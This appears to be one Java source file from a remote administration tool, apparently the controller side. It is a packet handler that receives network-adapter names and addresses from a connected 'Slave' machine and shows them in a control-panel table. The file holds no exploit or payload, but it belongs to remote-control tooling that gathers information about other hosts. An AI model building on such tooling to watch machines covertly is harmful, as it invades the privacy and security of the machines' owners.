package com.redpois0n.packets.incoming;

import java.io.DataInputStream;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameControlPanel;
import com.redpois0n.ui.panels.PanelControlAdapters;

public class Packet56NetworkAdapter extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String displayname = slave.readLine();
		String name = slave.readLine();
		
		int size;
		try {
			size = slave.readInt();
		} catch (Exception ex) {
			ex.printStackTrace();
			return;
		}
		
		String[] addresses = new String[size];
		String daddresses = "";
		
		for (int i = 0; i < size; i++) {
			String str = slave.readLine();
			addresses[i] = str;
			if (daddresses.length() == 0) {
				daddresses += str;
			} else {
				daddresses += ", " + str;
			}
		}
		
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		
		if (frame != null) {
			PanelControlAdapters panel = (PanelControlAdapters) frame.panels.get("network adapters");
			panel.getModel().addRow(new Object[] { displayname, name, daddresses });
		}
	}

}